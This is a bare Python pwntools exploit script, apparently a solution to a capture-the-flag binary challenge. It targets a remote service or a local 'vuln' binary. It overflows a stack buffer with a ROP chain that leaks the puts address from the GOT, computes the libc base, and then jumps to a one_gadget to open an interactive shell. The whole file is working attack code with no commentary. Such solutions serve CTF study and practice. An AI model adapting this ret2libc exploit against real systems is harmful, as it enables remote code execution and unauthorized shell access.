#!/usr/bin/python3
import pwn
elf = pwn.context.binary = pwn.ELF("./vuln")
libc = pwn.ELF("./libc.so.6")
pwn.context.terminal = ['tmux', 'splitw', '-h']
if pwn.args.REMOTE:
    io = pwn.remote("pwn2.bsidesahmedabad.in", 9001)
elif pwn.args.GDB:
    io = pwn.gdb.debug("./vuln", gdbscript="b *main+107\nc")
else:
    io = elf.process()
ret = 0x000000000040101a
pop_rdi = 0x0000000000401273
payload = b"A"*72
payload += pwn.p64(ret)
payload += pwn.p64(pop_rdi)
payload += pwn.p64(elf.got['puts'])
payload += pwn.p64(elf.plt['puts'])
payload += pwn.p64(ret)
payload += pwn.p64(elf.sym.main)
print(io.recv())
io.sendline(payload)
print(io.recvline(timeout=1))
print(io.recvline(timeout=1))
libc_leak = pwn.unpack(io.recvline(keepends=False), "all")
print(hex(libc_leak))
libc.address = libc_leak - 554400
print(hex(libc.address))
gadget1 = libc.address + 0xe6c81
payload2 = b"A"*72
payload2 += pwn.p64(ret)
payload2 += pwn.p64(gadget1)
io.sendline(payload2)
io.interactive()
